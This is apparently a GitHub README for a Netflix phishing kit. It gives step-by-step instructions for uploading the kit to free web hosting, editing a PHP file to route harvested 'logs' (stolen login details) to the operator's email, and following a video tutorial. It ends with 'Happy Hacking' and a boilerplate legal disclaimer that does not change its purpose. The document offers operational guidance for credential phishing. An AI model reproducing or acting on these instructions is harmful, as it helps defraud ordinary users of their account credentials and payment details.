# Netflix-Scam-Page-

## Installations :

## 1. Upload this zip file to any webhosting site.I recommend 000webhost.com
## 2. Extract the zip file to web  home directory and delete it
## 3. Now go to workshop/mine.php and change the email with your email address
## 4. All the logs will be sent to your email and it will be saved as result.html

## For video tutorial follow this link :
### Click here https://youtu.be/keStLnK5Www


## Requirements :

- Any webhosting Site
- Should know how to use Pc

## ScreenShot :


   <p align="left">
    <img src="https://raw.githubusercontent.com/swagkarna/Netflix-Scam-Page-/master/oie_z9xTZipi357Q.png">
    </p>
   
   <p align="left">
     <img src="https://raw.githubusercontent.com/swagkarna/Netflix-Scam-Page-/master/oie_WEGXqrXGKQwS.png">
     </p>
   
     
   
## Happy Hacking :

 ![Netflix-Scam-Page](https://raw.githubusercontent.com/swagkarna/Netflix-Scam-Page/master/giphy.gif)


   
## Legal Disclaimer:

**Usage of  this tool for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.**
